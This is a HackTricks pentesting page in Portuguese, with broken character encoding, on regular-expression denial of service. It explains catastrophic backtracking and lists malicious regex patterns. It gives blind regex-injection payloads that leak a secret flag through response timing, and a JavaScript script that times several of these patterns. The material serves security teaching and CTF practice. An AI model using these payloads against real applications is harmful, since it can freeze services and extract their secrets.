# Regular expression Denial of Service - ReDoS

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- VocÃª trabalha em uma **empresa de seguranÃ§a cibernÃ©tica**? VocÃª quer ver sua **empresa anunciada no HackTricks**? ou vocÃª quer ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas tÃ©cnicas de hacking enviando PRs para o [repositÃ³rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## IntroduÃ§Ã£o

**Copiado de** [**https://owasp.org/www-community/attacks/Regular\_expression\_Denial\_of\_Service\_-\_ReDoS**](https://owasp.org/www-community/attacks/Regular\_expression\_Denial\_of\_Service\_-\_ReDoS)

O **Regular expression Denial of Service (ReDoS)** Ã© um ataque de [NegaÃ§Ã£o de ServiÃ§o](https://owasp.org/www-community/attacks/Denial\_of\_Service), que explora o fato de que a maioria das implementaÃ§Ãµes de ExpressÃ£o Regular podem chegar a situaÃ§Ãµes extremas que as fazem trabalhar muito lentamente (exponencialmente relacionado ao tamanho da entrada). Um atacante pode entÃ£o fazer com que um programa que usa uma ExpressÃ£o Regular entre nessas situaÃ§Ãµes extremas e fique pendurado por um longo perÃ­odo de tempo.

### DescriÃ§Ã£o

#### O algoritmo ingÃªnuo de Regex problemÃ¡tico <a href="#the-problematic-regex-naive-algorithm" id="the-problematic-regex-naive-algorithm"></a>

O algoritmo ingÃªnuo de ExpressÃ£o Regular constrÃ³i um [AutÃ´mato Finito NÃ£o-DeterminÃ­stico (AFND)](https://en.wikipedia.org/wiki/Nondeterministic\_finite\_state\_machine), que Ã© uma mÃ¡quina de estados finitos onde para cada par de estado e sÃ­mbolo de entrada pode haver vÃ¡rios possÃ­veis estados seguintes. Em seguida, o mecanismo comeÃ§a a fazer transiÃ§Ãµes atÃ© o final da entrada. Como pode haver vÃ¡rios possÃ­veis estados seguintes, um algoritmo determinÃ­stico Ã© usado. Este algoritmo tenta um por um todos os caminhos possÃ­veis (se necessÃ¡rio) atÃ© que uma correspondÃªncia seja encontrada (ou todos os caminhos sejam tentados e falhem).

Por exemplo, a ExpressÃ£o Regular `^(a+)+$` Ã© representada pelo seguinte AFND:

![AutÃ´mato Finito NÃ£o-DeterminÃ­stico](https://owasp.org/www-community/assets/images/attacks/NFA.png)

Para a entrada `aaaaX`, existem 16 caminhos possÃ­veis no grÃ¡fico acima. Mas para `aaaaaaaaaaaaaaaaX` existem 65536 caminhos possÃ­veis, e o nÃºmero dobra para cada `a` adicional. Este Ã© um caso extremo em que o algoritmo ingÃªnuo Ã© problemÃ¡tico, porque ele deve passar por muitos caminhos e, em seguida, falhar.

Observe que nem todos os algoritmos sÃ£o ingÃªnuos, e na verdade os algoritmos de Regex podem ser escritos de maneira eficiente. Infelizmente, a maioria dos motores de Regex hoje tentam resolver nÃ£o apenas Regexes "puros", mas tambÃ©m Regexes "expandidos" com "adiÃ§Ãµes especiais", como referÃªncias inversas que nem sempre podem ser resolvidas de maneira eficiente (veja **PadrÃµes para linguagens nÃ£o regulares** em [Wiki-Regex](https://en.wikipedia.org/wiki/Regular\_expression) para mais detalhes). EntÃ£o, mesmo que a Regex nÃ£o seja "expandida", um algoritmo ingÃªnuo Ã© usado.

#### Regexes maliciosos <a href="#evil-regexes" id="evil-regexes"></a>

Uma Regex Ã© chamada de "maliciosa" se ela puder ficar presa em uma entrada criada.

**O padrÃ£o de Regex malicioso contÃ©m**:

* Agrupamento com repetiÃ§Ã£o
* Dentro do grupo repetido:
  * RepetiÃ§Ã£o
  * AlternÃ¢ncia com sobreposiÃ§Ã£o

**Exemplos de PadrÃµes Maliciosos**:

* `(a+)+`
* `([a-zA-Z]+)*`
* `(a|aa)+`
* `(a|a?)+`
* `(.*a){x} para x \> 10`

Todos os acima sÃ£o suscetÃ­veis Ã  entrada `aaaaaaaaaaaaaaaaaaaaaaaa!` (O comprimento mÃ­nimo da entrada pode mudar ligeiramente, ao usar mÃ¡quinas mais rÃ¡pidas ou mais lentas).

## Cargas Ãºteis ReDoS

### ExfiltraÃ§Ã£o de string via ReDoS

Em um CTF (ou recompensa por bugs), talvez vocÃª **controle a Regex com a qual uma informaÃ§Ã£o sensÃ­vel (a flag) Ã© correspondida**. EntÃ£o, se for Ãºtil fazer com que a **pÃ¡gina congele (tempo limite ou tempo de processamento mais longo)** se uma **Regex corresponder** e **nÃ£o se corresponder**. Dessa forma, vocÃª poderÃ¡ **exfiltrar** a string **caractere por caractere**:

* Neste [**post**](https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets) vocÃª pode encontrar esta regra ReDoS: `^(?=<flag>)((.*)*)*salt$`
  * Exemplo: `^(?=HTB{sOmE_flÂ§NÂ§)((.*)*)*salt$`
* Neste [**writeup**](https://github.com/jorgectf/Created-CTF-Challenges/blob/main/challenges/TacoMaker%20%40%20DEKRA%20CTF%202022/solver/solver.html) vocÃª pode encontrar este: `<flag>(((((((.*)*)*)*)*)*)*)!`
* Neste [**writeup**](https://ctftime.org/writeup/25869) ele usou: `^(?=${flag_prefix}).*.*.*.*.*.*.*.*!!!!$`

### ReDoS controlando entrada e Regex

Os seguintes sÃ£o exemplos de **ReDoS** onde vocÃª **controla** tanto a **entrada** quanto a **Regex**:
```javascript
function check_time_regexp(regexp, text){
    var t0 = new Date().getTime();;
    new RegExp(regexp).test(text);
    var t1 = new Date().getTime();;
    console.log("Regexp " + regexp + " took " + (t1 - t0) + " milliseconds.")
}

// This payloads work because the input has several "a"s
[
//  "((a+)+)+$",  //Eternal,
//  "(a?){100}$", //Eternal
    "(a|a?)+$",
    "(\\w*)+$",   //Generic
    "(a*)+$",
    "(.*a){100}$",
    "([a-zA-Z]+)*$", //Generic
    "(a+)*$",
].forEach(regexp => check_time_regexp(regexp, "aaaaaaaaaaaaaaaaaaaaaaaaaa!"))

/*
Regexp (a|a?)+$ took 5076 milliseconds.
Regexp (\w*)+$ took 3198 milliseconds.
Regexp (a*)+$ took 3281 milliseconds.
Regexp (.*a){100}$ took 1436 milliseconds.
Regexp ([a-zA-Z]+)*$ took 773 milliseconds.
Regexp (a+)*$ took 723 milliseconds.
*/
```
## Ferramentas

* [https://github.com/doyensec/regexploit](https://github.com/doyensec/regexploit)
* [https://devina.io/redos-checker](https://devina.io/redos-checker)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- VocÃª trabalha em uma **empresa de seguranÃ§a cibernÃ©tica**? VocÃª quer ver sua **empresa anunciada no HackTricks**? ou vocÃª quer ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe seus truques de hacking enviando PRs para o [repositÃ³rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
